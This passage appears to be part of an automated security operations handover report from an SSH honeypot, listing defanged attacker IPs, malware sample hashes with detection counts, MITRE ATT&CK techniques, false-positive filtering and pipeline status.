| `20.12.41[.]6` | **16** | 2026-06-07 15:00 | 2026-06-07 15:39 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.167.237[.]191` | **15** | 2026-06-07 14:01 | 2026-06-07 14:26 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **12** | 2026-06-07 14:00 | 2026-06-07 15:10 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `103.167.89[.]222` | **9** | 2026-06-07 14:01 | 2026-06-07 14:17 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `121.31.210[.]47` | 1 | 2026-06-07 14:49 | 2026-06-07 14:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.65.150[.]145` | 1 | 2026-06-07 15:34 | 2026-06-07 15:34 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]232` | 1 | 2026-06-07 15:13 | 2026-06-07 15:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `169.239.104[.]195` | 1 | 2026-06-07 14:08 | 2026-06-07 14:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.83.158[.]131` | 1 | 2026-06-07 15:39 | 2026-06-07 15:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.236.109[.]13` | 1 | 2026-06-07 15:28 | 2026-06-07 15:28 | 12s | 0 | `T1592` | 🟢 LOW |
| `210.90.155[.]178` | 1 | 2026-06-07 14:03 | 2026-06-07 14:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-06-07 14:35 | 2026-06-07 14:36 | 31s | 0 | `T1592` | 🟢 LOW |
| `51.68.226[.]87` | 1 | 2026-06-07 15:15 | 2026-06-07 15:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.20.236[.]52` | 1 | 2026-06-07 14:54 | 2026-06-07 14:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.205.57[.]72` | 1 | 2026-06-07 15:16 | 2026-06-07 15:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (33 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `20.83.158[.]131` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `217.154.180[.]67` | ES | IONOS SE | **100** ⚠️ | 4 |
| `121.31.210[.]47` | CN | China Unicom Guangxi province network | **100** ⚠️ | 3 |
| `143.198.80[.]171` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `92.205.57[.]72` | FR | Host Europe GmbH | **100** ⚠️ | 50 |
| `20.12.41[.]6` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `190.167.237[.]191` | DO | Compañía Dominicana de Teléfonos S. A. | **100** ⚠️ | 50 |
| `58.20.236[.]52` | CN | CNC Group HuNan JiShou network | **100** ⚠️ | 50 |
| `14.103.233[.]27` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 161 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 101 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 59 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 258 cases |
| Tool 34  | Credential Extractor        | ✅ 160 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (10.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 33 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 59 priority case(s) shown individually · 20 recon entry/entries in table (9 group(s) consolidating 161 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-07T15:41:03Z_
